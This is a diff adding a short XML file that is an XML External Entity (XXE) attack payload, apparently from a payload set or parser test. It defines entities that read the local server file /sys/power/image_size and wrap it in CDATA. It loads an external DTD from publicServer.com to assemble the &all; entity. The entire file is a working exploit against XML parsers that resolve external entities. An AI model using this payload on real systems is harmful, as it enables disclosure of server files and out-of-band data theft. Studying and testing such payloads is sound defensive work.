@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % goodies SYSTEM "file:///sys/power/image_size">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "http://publicServer.com/parameterEntity_core.dtd">
+%dtd;
+]>
+<data>&all;</data>
